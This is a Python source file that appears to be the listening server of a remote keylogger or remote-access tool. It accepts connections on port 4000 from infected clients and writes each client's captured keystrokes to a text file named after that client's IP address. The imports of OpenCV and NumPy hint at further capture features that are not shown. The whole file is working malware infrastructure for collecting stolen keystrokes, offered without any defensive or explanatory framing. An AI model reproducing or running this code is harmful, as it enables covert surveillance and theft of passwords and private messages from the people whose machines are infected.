import socket
import cv2
import threading
import numpy as np

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

clients = []
client_sockets = {}

# Function to handle keypress data.
def handle_keypress(client_socket):
    client_address = client_socket.getpeername()[0]
    file_name = f"{client_address}.txt"
    
    with open(file_name, 'a') as file:
        while True:
            try:
                keypress = client_socket.recv(BUFFER_SIZE).decode()
                if not keypress:
                    break
                print(f"Keypress: {keypress}")
                file.write(keypress + '\n')
            except Exception as e:
                print(f"Error: {e}")
                break
    client_socket.close()


# Function to start the server and wait for a connection.
def start_server(update_clients_list):
    global s
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")
   


    while True:
        client_socket, client_address = s.accept()
        clients.append(client_address)
        client_sockets[client_address] = client_socket
        update_clients_list(clients)
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        threading.Thread(target=handle_keypress, args=(client_socket,)).start()


# Function to stop the server.
def stop_server():
    try:
        for client in clients:
            client_sockets[client].close()
        s.close()
    except:
        pass